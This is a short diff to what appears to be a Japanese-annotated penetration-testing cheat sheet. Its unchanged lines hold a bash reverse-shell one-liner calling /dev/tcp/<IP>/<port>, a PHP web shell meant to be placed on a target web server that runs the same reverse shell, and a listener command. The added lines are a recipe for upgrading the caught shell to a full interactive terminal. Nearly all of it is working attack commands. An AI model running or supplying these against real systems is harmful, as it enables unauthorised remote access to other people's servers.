@@ -11,3 +11,6 @@ bash -c 'bash -i>& /dev/tcp/<IP>/<port> 0>&1' #標準のシェルが何かわか
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"); #phpファイルにしてターゲットのＷｅｂサーバに配置
 python -m http.server 4444 #待ち受け
 
+//pythonでシェルのアップグレード
+ python3 -c "import pty;pty.spawn('/bin/bash')" #このあとバックグラウンドにおとす
+stty raw -echo; fg #完了
